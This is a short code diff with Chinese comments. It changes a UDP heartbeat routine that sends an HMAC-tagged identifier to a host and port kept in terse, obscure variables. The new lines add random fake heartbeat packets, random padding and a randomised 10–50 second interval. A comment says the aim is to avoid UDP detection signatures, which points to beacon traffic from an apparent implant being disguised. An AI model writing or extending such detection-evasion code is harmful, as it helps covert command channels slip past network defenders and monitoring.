@@ -35,10 +35,19 @@ def _hb_start():
                     try:
                         # M4：心跳带 HMAC(_K, bid) 前 8 字节，防伪造刷新
                         mac = _hm.new(_K, _D.encode(), _hl.sha256).digest()[:8]
-                        u.sendto(_D.encode() + mac, (_H, _P))
+                        # 流量混淆: 30% 假心跳(纯随机字节,服务端 MAC 校验失败
+                        # 忽略) + 真心跳随机填充 0-40B → 线上包 24-64B 随机大小
+                        # (mac 必须保持在帧尾——服务端按 <bid 16><mac 8> 最后 8B 解析)
+                        if rnd.random() < 0.3:
+                            u.sendto(sec.token_bytes(rnd.randint(24, 64)),
+                                     (_H, _P))
+                        else:
+                            pad = sec.token_bytes(rnd.randint(0, 40))
+                            u.sendto(_D.encode() + pad + mac, (_H, _P))
                     except OSError:
                         pass
-                    _hb_stop_ev.wait(30)
+                    # 间隔随机 10-50s(原固定 30s,固定周期是 UDP 检测特征)
+                    _hb_stop_ev.wait(rnd.uniform(10, 50))
                 u.close()
             except Exception:
                 pass
